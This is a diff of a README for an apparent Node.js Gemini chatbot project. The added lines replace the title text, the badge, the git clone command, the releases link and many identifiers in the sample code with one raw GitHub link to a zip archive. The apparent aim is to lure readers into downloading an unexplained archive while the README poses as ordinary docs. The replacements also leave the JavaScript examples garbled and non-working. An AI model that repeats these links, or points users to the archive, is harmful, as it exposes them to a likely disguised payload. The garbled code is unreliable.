@@ -1,8 +1,8 @@
-# Gemini Node: Integrating Google Gemini API with Node.js for Intelligent Chatbots and AI Tools 🤖🌌
+# Gemini Node: Integrating Google Gemini API with https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip for Intelligent Chatbots and AI Tools 🤖🌌
 
-![Gemini Node](https://img.shields.io/badge/Gemini%20Node-Integrate%20Google%20Gemini%20API-blue?style=for-the-badge)
+![Gemini Node](https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip%20Node-Integrate%20Google%20Gemini%20API-blue?style=for-the-badge)
 
-Welcome to the **Gemini Node** repository! This project focuses on integrating the Google Gemini API with Node.js to build intelligent chatbots and automated tools powered by generative AI. Whether you're a developer looking to enhance your chatbot capabilities or someone interested in exploring AI tools, this repository provides the necessary resources to get started.
+Welcome to the **Gemini Node** repository! This project focuses on integrating the Google Gemini API with https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip to build intelligent chatbots and automated tools powered by generative AI. Whether you're a developer looking to enhance your chatbot capabilities or someone interested in exploring AI tools, this repository provides the necessary resources to get started.
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ With the rise of generative AI, we can now build applications that understand co
 - **Easy Integration**: Seamlessly connect to the Google Gemini API.
 - **Chatbot Framework**: Build chatbots with natural language understanding.
 - **Generative AI Tools**: Create applications that generate responses based on user input.
-- **Node.js Compatibility**: Utilize the power of Node.js for backend development.
+- **https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip Compatibility**: Utilize the power of https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip for backend development.
 - **Comprehensive Documentation**: Access detailed guides and examples.
 
 ## Installation
@@ -38,7 +38,7 @@ To get started with **Gemini Node**, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/SquidyMp/gemini-node.git
+   git clone https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip
    cd gemini-node
    ```
 
@@ -84,11 +84,11 @@ You can use the `axios` library to make requests to the Gemini API. Here's a sim
 const axios = require('axios');
 
 async function getResponse(userInput) {
-    const response = await axios.post('https://api.gemini.com/v1/chat', {
+    const response = await https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip('https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip', {
         prompt: userInput,
-        apiKey: process.env.GEMINI_API_KEY,
+        apiKey: https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip,
     });
-    return response.data;
+    return https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip;
 }
 ```
 
@@ -130,16 +130,16 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 
-app.use(bodyParser.json());
+https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip(https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip());
 
-app.post('/chat', async (req, res) => {
-    const userInput = req.body.message;
+https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip('/chat', async (req, res) => {
+    const userInput = https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip;
     const response = await getResponse(userInput);
-    res.json(response);
+    https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip(response);
 });
 
-app.listen(3000, () => {
-    console.log('Chatbot server running on port 3000');
+https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip(3000, () => {
+    https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip('Chatbot server running on port 3000');
 });
 ```
 
@@ -164,7 +164,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit the [Releases](https://github.com/SquidyMp/gemini-node/releases) section. Here you can find the most recent updates and download the latest version of the project.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/SquidyMp/gemini-node/main/src/node_gemini_2.4.zip) section. Here you can find the most recent updates and download the latest version of the project.
 
 ---
 
